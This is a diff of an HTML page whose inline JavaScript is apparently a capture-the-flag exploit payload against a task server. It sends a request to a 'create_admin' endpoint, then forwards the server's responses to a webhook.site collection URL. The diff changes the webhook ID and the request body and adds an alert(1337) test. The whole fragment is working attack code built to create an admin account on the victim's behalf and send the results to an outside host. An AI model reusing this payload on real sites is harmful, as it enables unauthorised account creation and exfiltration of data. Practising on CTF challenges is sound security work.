@@ -16,12 +16,12 @@ fetch('https://tasks.goidactf.ru:20061/create_admin', {
     headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
     },
-    body: 'new_admin_login=123'
+    body: {'new_admin_login':123}
 })
 .then(response => response.text())
 .then(result => {
     // Отправляем результат на webhook
-    fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+    fetch('https://webhook.site/51d17ff9-f8ec-4afc-b3f4-ec4530342b83', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -47,7 +47,7 @@ fetch('https://tasks.goidactf.ru:20061/create_admin', {
         })
         .then(r => r.text())
         .then(r => {
-            fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+            fetch('https://webhook.site/51d17ff9-f8ec-4afc-b3f4-ec4530342b83', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -60,6 +60,7 @@ fetch('https://tasks.goidactf.ru:20061/create_admin', {
     };
     document.body.appendChild(btn);
 });
+    alert(1337)
 </script>
 </body>
 </html>
